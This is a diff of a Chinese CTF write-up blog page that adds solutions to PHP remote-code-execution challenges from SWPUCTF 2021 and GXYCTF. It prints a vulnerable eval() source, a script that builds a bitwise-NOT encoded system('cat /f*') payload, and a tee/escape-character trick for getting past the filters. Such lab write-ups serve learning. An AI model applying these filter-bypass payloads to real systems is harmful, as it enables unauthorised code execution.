@@ -24,8 +24,13 @@
 <meta property="og:description" content="[SWPUCTF 2021 新生赛]easyrce0X00 被坑了 这道题看见了eval()函数，这个函数可以把字符串当做php代码执行，但是…. PHP eval() 函数 | 菜鸟教程 (runoob.com) 0x01  system &amp;&amp; shell_eval 直接尝试运行代码，读取flag  cat &#x2F;f*  但是这个时候我是用shell_eval()没有任何反">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240104221824671.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107221731062.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240109140535072.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240109140543624.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240109140656434.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240109140731254.png">
 <meta property="article:published_time" content="2024-01-04T13:22:59.000Z">
-<meta property="article:modified_time" content="2024-01-07T03:59:06.734Z">
+<meta property="article:modified_time" content="2024-01-09T06:07:33.791Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="CTF刷题记录">
 <meta name="twitter:card" content="summary_large_image">
@@ -229,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          485 words
+          1.8k words
         
       </span>
     
@@ -240,7 +245,7 @@
         
         
         
-          5 mins
+          16 mins
         
       </span>
     
@@ -319,7 +324,48 @@
 </blockquote>
 <h1 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h1><p><strong>0x00</strong></p>
 <p>这道题总体来说还是比较简单，用到的知识点是空格绕过和变量绕过</p>
+<p><strong>0x01</strong> </p>
+<h1 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h1><p>0x00</p>
+<p>这道题比较惊奇，学到了取反绕过</p>
+<p>0x01</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107221731062.png" srcset="/img/loading.gif" lazyload alt="image-20240107221731062"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$wllm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>];<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;\t&#x27;</span>,<span class="hljs-string">&#x27;\r&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\+&#x27;</span>,<span class="hljs-string">&#x27;\[&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\-&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\*&#x27;</span>,<span class="hljs-string">&#x27;\?&#x27;</span>,<span class="hljs-string">&#x27;\&lt;&#x27;</span>,<span class="hljs-string">&#x27;\&gt;&#x27;</span>,<span class="hljs-string">&#x27;\=&#x27;</span>,<span class="hljs-string">&#x27;\`&#x27;</span>,];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$wllm</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);<br>    &#125;&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="hljs-variable">$wllm</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$wllm</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;蔡总说：注意审题！！！&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现没有过滤<code>~</code>，所以可以使用取反过滤</p>
+<p><strong>0x02</strong></p>
+<p>直接使用php编写payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;(~&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&quot;system&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;)&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;(~&quot;</span>;<br><span class="hljs-comment">// echo &quot;\n&quot;;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&quot;cat /f*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;);&quot;</span>;<br><br><br></code></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>(<del>%8C%86%8C%8B%9A%92)(</del>%9C%9E%8B%DF%D0%99%D5);</p>
+</blockquote>
+<h1 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h1><p><strong>0x00</strong></p>
+<p>这道题主要是使用知识点有</p>
+<ol>
+<li><p>tee命令</p>
+<blockquote>
+<p>从标准输入读取数据并重定向到标准输出和文件。</p>
+</blockquote>
+</li>
+<li><p>exec()</p>
+<blockquote>
+<p>php 的这个函数不会输出到页面，我们需要利用tee读取文件内容</p>
+</blockquote>
+</li>
+<li><p>转义字符</p>
+</li>
+</ol>
 <p><strong>0x01</strong></p>
+<p>要绕过这个必须使用转义字符，但是这个没有发生转义，所以可以直接运行</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240109140535072.png" srcset="/img/loading.gif" lazyload alt="image-20240109140535072"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240109140543624.png" srcset="/img/loading.gif" lazyload alt="image-20240109140543624"></p>
+<p><strong>0x02</strong></p>
+<p>接着读取flllllaaaaaaggggggg文件</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240109140656434.png" srcset="/img/loading.gif" lazyload alt="image-20240109140656434"></p>
+<p>因为过滤了la所以这这里使用转义</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240109140731254.png" srcset="/img/loading.gif" lazyload alt="image-20240109140731254"></p>
 
                 
               </div>
